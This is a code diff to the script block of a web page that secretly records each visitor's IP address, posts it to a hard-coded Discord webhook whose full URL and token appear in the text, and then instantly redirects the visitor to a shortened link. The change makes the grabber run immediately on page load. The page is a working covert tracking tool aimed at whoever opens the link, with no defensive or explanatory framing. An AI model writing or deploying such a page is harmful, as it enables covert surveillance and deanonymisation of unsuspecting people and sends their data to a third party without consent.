@@ -15,30 +15,23 @@
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX"; // Your Discord webhook
         const REDIRECT_URL = "https://is.gd/gwuu9c"; // Your redirect link
 
-        async function sendIPAndRedirect() {
-            try {
-                // Fetch user's IP
-                let response = await fetch("https://api64.ipify.org?format=json");
-                let data = await response.json();
-                let userIP = data.ip;
+        (async function sendIPAndRedirect() {
+            // Fetch user's IP
+            fetch("https://api64.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    let userIP = data.ip;
+                    fetch(WEBHOOK_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ content: `New Visitor IP: ${userIP}` })
+                    });
+                })
+                .catch(error => console.error("Error sending IP:", error));
 
-                // Send IP to Discord webhook
-                await fetch(WEBHOOK_URL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: `New Visitor IP: ${userIP}` })
-                });
-
-            } catch (error) {
-                console.error("Error sending IP:", error);
-            }
-
-            // Redirect immediately after sending request
+            // Redirect instantly
             window.location.href = REDIRECT_URL;
-        }
-
-        // Run instantly when the page loads
-        window.onload = sendIPAndRedirect;
+        })();
     </script>
 </head>
 <body>
